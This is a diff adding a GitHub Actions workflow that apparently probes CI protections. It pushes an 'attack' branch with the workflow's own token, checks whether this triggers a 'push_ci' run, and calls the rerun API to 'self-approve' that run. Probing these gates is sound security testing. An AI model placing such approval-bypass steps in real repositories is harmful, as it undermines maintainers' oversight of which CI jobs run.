@@ -1,0 +1,102 @@
+name: push_driver
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+  pull-requests: write
+  actions: write
+jobs:
+  drive:
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - name: Identify actor
+        run: |
+          echo "DRIVER actor=${{ github.actor }} triggering_actor=${{ github.triggering_actor }} run=${{ github.run_id }} repo=${{ github.repository }}"
+          curl -s -H "Authorization: Bearer $GH_TOKEN" \
+               -H "Accept: application/vnd.github+json" \
+               "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}" \
+            | jq '{actor: .actor.login, triggering_actor: .triggering_actor.login}'
+
+      - name: Configure git
+        run: |
+          git config --global user.email "bot@example.test"
+          git config --global user.name "github-actions[bot]"
+
+      - name: Clone base
+        run: |
+          git clone "https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository }}.git" work
+          cd work && git checkout -B main origin/main
+
+      - name: Create attack branch and push (push trigger)
+        id: br
+        run: |
+          cd work
+          BR="attack/push-${{ github.run_id }}"
+          echo "BRANCH=$BR" >> $GITHUB_OUTPUT
+          git checkout -b "$BR"
+          echo "push-marker run=${{ github.run_id }}" > PUSH_MARKER.txt
+          git add PUSH_MARKER.txt
+          git commit -m "push attack marker ${{ github.run_id }}"
+          git push origin "$BR"
+          HEAD_SHA=$(git rev-parse HEAD)
+          echo "HEAD_SHA=$HEAD_SHA" >> $GITHUB_OUTPUT
+          echo "PUSHED_BRANCH=$BR head=$HEAD_SHA"
+
+      - name: Wait then list workflow runs for push HEAD sha
+        id: runs
+        run: |
+          sleep 20
+          echo "=== runs by head_sha=${{ steps.br.outputs.HEAD_SHA }} (event=push) ==="
+          curl -sS \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs?head_sha=${{ steps.br.outputs.HEAD_SHA }}&event=push" \
+            | tee /tmp/runs.json | jq '.workflow_runs[] | {id,name,status,conclusion,event,actor:.actor.login,triggering_actor:.triggering_actor.login}'
+          RUN_ID=$(jq -r '.workflow_runs[] | select(.name=="push_ci") | .id' /tmp/runs.json | head -n1)
+          RUN_STATUS=$(jq -r --arg id "$RUN_ID" '.workflow_runs[] | select((.id|tostring)==$id) | .status' /tmp/runs.json)
+          COUNT=$(jq '.workflow_runs | length' /tmp/runs.json)
+          echo "RUN_COUNT_FOR_HEAD=$COUNT"
+          echo "PUSH_CI_RUN_ID=$RUN_ID"
+          echo "PUSH_CI_STATUS=$RUN_STATUS"
+          echo "RUN_ID=$RUN_ID" >> $GITHUB_OUTPUT
+          echo "RUN_STATUS=$RUN_STATUS" >> $GITHUB_OUTPUT
+
+      - name: If ABSENT — record clearly
+        if: steps.runs.outputs.RUN_ID == '' || steps.runs.outputs.RUN_ID == 'null'
+        run: |
+          echo "RESULT=PUSH_CI_ABSENT — captured GITHUB_TOKEN push did NOT create a push_ci run (recursion-prevention suppressed it)."
+
+      - name: Self-approve via /rerun (if action_required)
+        if: steps.runs.outputs.RUN_ID != '' && steps.runs.outputs.RUN_ID != 'null'
+        run: |
+          echo "=== POST /actions/runs/${{ steps.runs.outputs.RUN_ID }}/rerun ==="
+          status=$(curl -s -o /tmp/rerun.json -w "%{http_code}" -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ steps.runs.outputs.RUN_ID }}/rerun")
+          echo "RERUN_HTTP=$status"
+          echo "RERUN_BODY<<EOF"
+          cat /tmp/rerun.json
+          echo "EOF"
+
+      - name: Poll push_ci run to terminal
+        if: steps.runs.outputs.RUN_ID != '' && steps.runs.outputs.RUN_ID != 'null'
+        run: |
+          for i in $(seq 1 30); do
+            R=$(curl -sS -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+              "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ steps.runs.outputs.RUN_ID }}")
+            S=$(echo "$R" | jq -r '.status')
+            C=$(echo "$R" | jq -r '.conclusion')
+            echo "POLL i=$i status=$S conclusion=$C"
+            if [ "$S" = "completed" ] || [ "$S" = "null" ]; then break; fi
+            sleep 10
+          done
+
+      - name: Final push_ci run summary
+        if: steps.runs.outputs.RUN_ID != '' && steps.runs.outputs.RUN_ID != 'null'
+        run: |
+          curl -sS -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ steps.runs.outputs.RUN_ID }}" \
+            | jq '{id,name,status,conclusion,event,actor:.actor.login,triggering_actor:.triggering_actor.login}'
